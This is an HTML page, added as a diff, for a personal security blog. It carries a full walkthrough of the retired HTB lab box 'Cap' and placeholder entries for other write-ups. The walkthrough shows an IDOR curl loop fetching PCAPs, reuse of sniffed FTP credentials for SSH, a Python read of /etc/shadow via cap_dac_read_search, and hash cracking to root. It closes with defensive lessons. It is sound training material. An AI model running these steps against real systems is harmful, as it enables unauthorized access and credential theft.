@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>~/blog — Harrison Kioko · Lab Notes & Walkthroughs</title>
+    <meta name="description" content="Security lab notes and HTB machine write-ups by Harrison Kioko — Cap, Blue, Mr. Robot and personal attack-lab projects.">
+
+    <!-- Security-by-design: strict CSP, self-only assets -->
+    <meta http-equiv="Content-Security-Policy" content="
+        default-src 'none';
+        script-src 'self';
+        style-src 'self';
+        img-src 'self' data:;
+        font-src 'self';
+        connect-src 'none';
+        media-src 'none';
+        frame-src 'none';
+        frame-ancestors 'none';
+        object-src 'none';
+        base-uri 'self';
+        form-action 'none';
+    ">
+    <meta name="referrer" content="no-referrer">
+    <meta name="theme-color" content="#0a0e14">
+
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%230a0e14'/%3E%3Ctext x='50%25' y='54%25' text-anchor='middle' dominant-baseline='middle' font-family='monospace' font-size='30' fill='%2338bdf8'%3E%3E_%3C/text%3E%3C/svg%3E">
+
+    <link rel="stylesheet" href="blog.css">
+</head>
+<body>
+    <a class="skip-link" href="#viewer">Skip to content</a>
+
+    <header class="blog-header">
+        <nav class="blog-nav" aria-label="Primary">
+            <a href="index.html" class="brand">
+                <span class="brand-prompt">>_</span><span class="brand-name">hkioko</span>
+            </a>
+            <span class="brand-slash">/</span>
+            <a href="index.html" class="brand-sub">home</a>
+            <span class="brand-slash">/</span>
+            <span class="nav-current">blog</span>
+            <a href="index.html#contact" class="status-pill">
+                <span class="status-dot"></span>OPEN TO WORK
+            </a>
+        </nav>
+    </header>
+
+    <main class="blog-layout">
+        <!-- ============ SIDEBAR ============ -->
+        <aside class="sidebar" aria-label="Blog entries">
+            <div class="toggle" role="group" aria-label="Filter entries">
+                <button type="button" class="toggle-btn" id="toggle-machines" aria-pressed="true">MACHINES</button>
+                <button type="button" class="toggle-btn" id="toggle-projects" aria-pressed="false">PROJECTS</button>
+            </div>
+
+            <nav class="entry-list" id="machine-list" aria-label="Machine walkthroughs">
+                <a href="#cap" class="list-item active" data-entry="cap">
+                    <span class="item-dot"></span>
+                    <span class="item-name">Cap</span>
+                    <span class="item-meta"><span class="pill plat">HTB</span><span class="pill diff">easy</span></span>
+                </a>
+                <a href="#blue" class="list-item" data-entry="blue">
+                    <span class="item-dot"></span>
+                    <span class="item-name">Blue</span>
+                    <span class="item-meta"><span class="pill plat">HTB</span><span class="pill diff">easy</span></span>
+                </a>
+                <a href="#mr-robot" class="list-item" data-entry="mr-robot">
+                    <span class="item-dot"></span>
+                    <span class="item-name">Mr. Robot</span>
+                    <span class="item-meta"><span class="pill plat">THM</span><span class="pill diff">medium</span></span>
+                </a>
+                <a href="#dc1" class="list-item" data-entry="dc1">
+                    <span class="item-dot"></span>
+                    <span class="item-name">DC-1</span>
+                    <span class="item-meta"><span class="pill plat">VulnHub</span><span class="pill diff">easy</span></span>
+                </a>
+            </nav>
+
+            <nav class="entry-list" id="project-list" aria-label="Project notes" hidden>
+                <a href="#ad-lab" class="list-item" data-entry="ad-lab">
+                    <span class="item-dot"></span>
+                    <span class="item-name">AD Security Lab</span>
+                    <span class="item-meta"><span class="pill plat">Lab</span></span>
+                </a>
+                <a href="#web-lab" class="list-item" data-entry="web-lab">
+                    <span class="item-dot"></span>
+                    <span class="item-name">Web App Security Lab</span>
+                    <span class="item-meta"><span class="pill plat">Lab</span></span>
+                </a>
+                <a href="#net-scanner" class="list-item" data-entry="net-scanner">
+                    <span class="item-dot"></span>
+                    <span class="item-name">Network Scanner</span>
+                    <span class="item-meta"><span class="pill plat">Tool</span></span>
+                </a>
+                <a href="#log-analyzer" class="list-item" data-entry="log-analyzer">
+                    <span class="item-dot"></span>
+                    <span class="item-name">Log Analyzer</span>
+                    <span class="item-meta"><span class="pill plat">Tool</span></span>
+                </a>
+            </nav>
+        </aside>
+
+        <!-- ============ VIEWER ============ -->
+        <section class="viewer" id="viewer" aria-live="polite">
+            <!-- ══════════ CAP — full walkthrough ══════════ -->
+            <article class="entry reveal" id="cap">
+                <header class="post-head">
+                    <div class="post-meta">
+                        <span class="pill plat">HTB</span>
+                        <span class="pill diff">Linux</span>
+                        <span class="pill diff">Easy</span>
+                    </div>
+                    <h1 class="post-title">Cap — Walkthrough</h1>
+                    <p class="post-sub">IDOR on a PCAP dashboard · reusable FTP creds · <code class="cod">cap_dac_read_search</code> to root</p>
+                    <p class="post-byline">harrison · ~45 min · last walked <time datetime="2026">2026</time></p>
+                </header>
+
+                <p class="post-intro">
+                    Cap is an easy Linux box that teaches two lessons that matter on real engagements:
+                    an interface can look airtight while its <strong>IDOR</strong> leaks historical data, and a single
+                    misconfigured Linux <strong>capability</strong> turns a low-privilege shell into arbitrary
+                    file read. No bruteforce, no kernel exploit — just enumeration and method.
+                </p>
+
+                <h2>1 · Enumeration</h2>
+                <pre><code># nmap -sC -sV -oA cap 10.10.10.245
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp open  http    gunicorn</code></pre>
+                <p>
+                    Three ports. FTP is anonymous-disabled, and gunicorn on 80 wants a look first.
+                    The web app — a “Security Dashboard” — has an <em>“IP Detection”</em> feature that
+                    captures 5 seconds of traffic and hands back a PCAP download link
+                    (<code class="cod">/download/&lt;id&gt;</code>).
+                </p>
+
+                <h2>2 · Web application — IDOR on capture IDs</h2>
+                <p>
+                    The dashboard only shows the latest capture, but the ID in the URL is a counter we
+                    can walk backwards. That’s the vulnerability: nothing on the server verifies
+                    <em>who</em> may fetch <em>which</em> capture.
+                </p>
+                <pre><code># curl -s http://10.10.10.245/capture          # -> /data/7 (latest)
+
+# fetch every capture, oldest first
+# for i in $(seq 0 7); do
+#   curl -s -o capture_$i.pcap http://10.10.10.245/download/$i
+# done
+
+# ls -la capture_0.pcap    # capture 0 is larger — and dated 2021-05-19</code></pre>
+                <p>
+                    Opening capture 0 in Wireshark and following the TCP stream shows the answer
+                    was sitting in plaintext FTP traffic all along:
+                </p>
+                <pre><code>USER nathan
+PASS Buck3tH4TF0RM3!</code></pre>
+
+                <h2>3 · Foothold (credential reuse)</h2>
+                <pre><code># ssh nathan@10.10.10.245
+Password: Buck3tH4TF0RM3!
+
+nathan@cap:~$ cat user.txt
+f5b9f1c0…      # user flag</code></pre>
+                <p>
+                    Same password works for SSH — classic credential reuse. A quick
+                    <code class="cod">id</code> confirms we are a regular user with no direct sudo rights.
+                </p>
+
+                <h2>4 · Privilege escalation — Linux capabilities</h2>
+                <pre><code>nathan@cap:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_dac_read_search+ep</code></pre>
+                <p>
+                    <code class="cod">cap_dac_read_search</code> bypasses the kernel’s DAC
+                    <em>read</em> permission checks — file ownership and mode are irrelevant. With a
+                    Python interpreter carrying that capability, we can read <code class="cod">/etc/shadow</code>:
+                </p>
+                <pre><code># cat &gt; rd.py &lt;&lt;'EOF'
+# import os
+# fd = os.open('/etc/shadow', os.O_RDONLY)
+# print(os.read(fd, 4096))
+# EOF
+nathan@cap:~$ python3.8 rd.py
+
+root:$6$tM1w…$…:19089:0:99999:7:::</code></pre>
+                <pre><code># john --wordlist=/usr/share/wordlists/rockyou.txt root.hash
+n0ts3cur3d#          (?)
+# su root
+Password: n0ts3cur3d#
+
+root@cap:~# cat /root/root.txt
+047c8f4b…      # root flag</code></pre>
+
+                <h2>5 · What this box is really testing</h2>
+                <ul class="takeaway">
+                    <li><strong>Never hide access control behind obscurity.</strong> An unguessable-looking ID is not a secret — enforce authorization server-side on <code class="cod">/download/&lt;id&gt;</code>.</li>
+                    <li><strong>Credential reuse is a foothold multiplier.</strong> FTP credentials became an SSH shell because the operator reused one password.</li>
+                    <li><strong>Capabilities are filesystem privileges.</strong> <code class="cod">cap_dac_read_search</code> (and its write cousins) effectively equals root for reads; audit with <code class="cod">getcap -r / 2&gt;/dev/null</code> and drop what nothing needs.</li>
+                </ul>
+
+                <p class="post-footer">Lab box, retired on HTB. Walkthrough is for learning — run only in environments you own.</p>
+            </article>
+
+            <!-- ══════════ PLACEHOLDER ENTRIES ══════════ -->
+            <article class="entry" id="blue" hidden>
+                <header class="post-head">
+                    <div class="post-meta">
+                        <span class="pill plat">HTB</span>
+                        <span class="pill diff">Windows</span>
+                        <span class="pill diff">Easy</span>
+                    </div>
+                    <h1 class="post-title">Blue — Walkthrough</h1>
+                    <p class="post-byline">harrison · status: writing</p>
+                </header>
+                <div class="coming-soon">
+                    <span class="cs-mark">[···········]</span>
+                    <p>The EternalBlue (MS17-010) walkthrough is being drafted. Back soon.</p>
+                </div>
+            </article>
+
+            <article class="entry" id="mr-robot" hidden>
+                <header class="post-head">
+                    <div class="post-meta">
+                        <span class="pill plat">THM</span>
+                        <span class="pill diff">Linux</span>
+                        <span class="pill diff">Medium</span>
+                    </div>
+                    <h1 class="post-title">Mr. Robot — Walkthrough</h1>
+                    <p class="post-byline">harrison · status: writing</p>
+                </header>
+                <div class="coming-soon">
+                    <span class="cs-mark">[···········]</span>
+                    <p>WordPress + SUID + the usual machine-archive rabbit holes. Living doc — check back after I blog Cap’s sibling.</p>
+                </div>
+            </article>
+
+            <article class="entry" id="dc1" hidden>
+                <header class="post-head">
+                    <div class="post-meta">
+                        <span class="pill plat">VulnHub</span>
+                        <span class="pill diff">Drupal</span>
+                        <span class="pill diff">Easy</span>
+                    </div>
+                    <h1 class="post-title">DC-1 — Walkthrough</h1>
+                    <p class="post-byline">harrison · status: writing</p>
+                </header>
+                <div class="coming-soon">
+                    <span class="cs-mark">[···········]</span>
+                    <p>Drupal exploitation + privilege escalation chain — drafting.</p>
+                </div>
+            </article>
+
+            <article class="entry" id="ad-lab" hidden>
+                <header class="post-head">
+                    <div class="post-meta">
+                        <span class="pill plat">Project</span>
+                        <span class="pill diff">Lab</span>
+                    </div>
+                    <h1 class="post-title">Active Directory Security Lab — Notes</h1>
+                    <p class="post-byline">harrison · status: writing</p>
+                </header>
+                <div class="coming-soon">
+                    <span class="cs-mark">[···········]</span>
+                    <p>Building + attacking a self-hosted AD lab: enumeration, Kerberos, PrivEsc and pivoting, findings and fix-notes included.</p>
+                </div>
+            </article>
+
+            <article class="entry" id="web-lab" hidden>
+                <header class="post-head">
+                    <div class="post-meta">
+                        <span class="pill plat">Project</span>
+                        <span class="pill diff">Lab</span>
+                    </div>
+                    <h1 class="post-title">Web Application Security Lab — Notes</h1>
+                    <p class="post-byline">harrison · status: writing</p>
+                </header>
+                <div class="coming-soon">
+                    <span class="cs-mark">[···········]</span>
+                    <p>Exploring BOLA, SQLi and JWT weaknesses against a self-hosted Python API — documentation in progress.</p>
+                </div>
+            </article>
+
+            <article class="entry" id="net-scanner" hidden>
+                <header class="post-head">
+                    <div class="post-meta">
+                        <span class="pill plat">Project</span>
+                        <span class="pill diff">Tool</span>
+                    </div>
+                    <h1 class="post-title">Network Scanner — Notes</h1>
+                    <p class="post-byline">harrison · status: writing</p>
+                </header>
+                <div class="coming-soon">
+                    <span class="cs-mark">[···········]</span>
+                    <p>Multi-threaded Python scanner with service detection — writing up design choices and results.</p>
+                </div>
+            </article>
+
+            <article class="entry" id="log-analyzer" hidden>
+                <header class="post-head">
+                    <div class="post-meta">
+                        <span class="pill plat">Project</span>
+                        <span class="pill diff">Tool</span>
+                    </div>
+                    <h1 class="post-title">Log Analyzer — Notes</h1>
+                    <p class="post-byline">harrison · status: writing</p>
+                </header>
+                <div class="coming-soon">
+                    <span class="cs-mark">[···········]</span>
+                    <p>Automated incident triage via log analysis — write-up coming.</p>
+                </div>
+            </article>
+        </section>
+    </main>
+
+    <footer class="blog-footer">
+        <p>© <span id="year">2026</span> Harrison Kioko · lab notes · static + CSP-clean · github-pages ready</p>
+    </footer>
+
+    <script src="blog.js"></script>
+</body>
+</html>
